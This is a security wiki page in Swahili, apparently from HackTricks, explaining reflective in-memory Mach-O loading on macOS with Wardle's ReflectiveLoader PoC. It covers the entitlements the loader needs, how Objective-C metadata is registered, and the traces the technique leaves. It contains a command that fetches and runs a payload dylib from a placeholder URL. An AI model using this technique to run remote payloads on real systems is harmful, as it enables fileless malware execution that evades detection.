# Upakiaji wa Reflective Mach-O kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

Reflective loader huweka Mach-O image kwenye kumbukumbu kutoka kwa bytes ambazo tayari ziko kwenye process yake yenyewe, kisha huiunganisha na kuendesha initializers zake bila kuomba system loader ifungue payload file. Huu ni **in-process code execution**, si privilege escalation wala primitive ya remote-process injection.<sup>[[2]](#references)</sup>

Kwenye macOS za hivi karibuni, njia ya zamani ya `NSCreateObjectFileImageFromMemory`/`NSLinkModule` huandika image kwenye diski. ReflectiveLoader badala yake hupachika code ya zamani ya Apple ya kupakia dyld; Wardle alionyesha hili kwenye macOS 15 na 26.<sup>[[2]](#references)[[3]](#references)</sup>

Ikiwa loader inatumia Hardened Runtime, code yake isiyosainiwa iliyo kwenye kumbukumbu inahitaji ruhusa ya executable memory kama vile `com.apple.security.cs.allow-unsigned-executable-memory` au `com.apple.security.cs.disable-executable-page-protection`; la sivyo, utekelezaji huzuiwa na utekelezaji wa masharti ya code-signing. Hili ni sharti la kusaini loader, si primitive ya elevation. Angalia [marejeleo ya macOS entitlements](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

Kwa PoC, toa URL inayohudumia raw Mach-O **bundle, framework, au dylib**. `main.mm` yake hukataa downloads tupu na husema kuwa payloads zinazotumia `LC_DYLD_CHAINED_FIXUPS` hazitumiki. Pia inakubali local pathname, lakini njia hiyo si workflow isiyotumia faili. Fomu ya URL husoma bytes kwenye `NSData` na kupitisha buffer yake pamoja na urefu wake kwa `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Embedded loader huita `ImageLoaderMachO::instantiateFromMemory`, kisha `image->link`. Inasajili metadata ya Objective-C **baada ya linking lakini kabla ya** `image->runInitializers`, ambayo huendesha constructors.<sup>[[5]](#references)</sup> Bila usajili huo, constructor inayotuma ujumbe wa Objective-C inaweza kushindwa kwa hitilafu ya `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Angalia [mtiririko wa kawaida wa upakiaji wa image wa dyld](macos-library-injection/macos-dyld-process.md#flow) na [marejeo ya sehemu za Mach-O](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Kuwasha metadata ya Objective-C

Tofauti na upakiaji wa kawaida wa dyld, kupachika image loader ya zamani hakufanyi metadata ya Objective-C ya payload ipatikane moja kwa moja kwa `libobjc`.<sup>[[3]](#references)</sup> Mbinu iliyorekebishwa ya LLVM JIT huchanganua sehemu za Objective-C zilizomapped kwenye `__DATA` na `__DATA_CONST`, kisha hufanya hatua hizi kabla ya constructors kuendeshwa:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Pitia `__objc_selrefs` kwa hatua za `sizeof(SEL)`. Pata jina la kila selector isiyo null kwa kutumia `sel_getName`, lipitishe kwa `sel_registerName`, na ubadilishe pointer ya sehemu hiyo iwe `SEL` canonical.
2. Kusanya classes kutoka `__objc_classlist` na uzisajili kwa `objc_readClassPair`, ukitatua utegemezi wa superclass kwanza.
3. Andika upya marejeo katika `__objc_classrefs` na `__objc_superrefs` yaelekee kwenye classes au metaclasses zilizosajiliwa, na uambatishe methods za categories kutoka `__objc_catlist`.

Kwa mfano, urekebishaji wa selector katika `ObjCRuntime.cpp` ni sawa na:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC hutegemea tabia ya ndani ya Objective-C runtime na haitumii vipengele vyote vya umbizo la Mach-O, kwa hiyo msimbo wake wa usajili ni marejeleo ya utekelezaji, si loader ya jumla inayoweza kutumika moja kwa moja.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Usajili unahitajika kwa Apple classes na methods zinazorejelewa, pamoja na classes zilizofafanuliwa na payload.<sup>[[3]](#references)</sup>

Image iliyopakiwa kwa njia ya reflective haionekani kwenye `dyld_all_image_infos` katika majaribio ya mwandishi. Badala yake, mappings zake za executable zisizo na majina zinaweza kuonekana kama maeneo ya `dylib` yasiyo na majina kwenye `vmmap`; frames zilizochukuliwa zinaweza kuonyeshwa kama `<unknown binary>`. Hizi ni dalili za ukaguzi, si ushahidi wa kuaminika kwamba loader hii ndiyo iliyozisababisha, na ufikiaji wa taarifa za task za mchakato mwingine unadhibitiwa na entitlements. Tazama [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) kwa vikwazo vya ufikiaji wa michakato.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C na Swift kwenye macOS: mkusanyiko wa maarifa](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Kurejesha Upakiaji wa Reflective Code kwenye macOS (Sehemu ya I)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Kurejesha Upakiaji wa Reflective Code kwenye macOS (Sehemu ya II)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
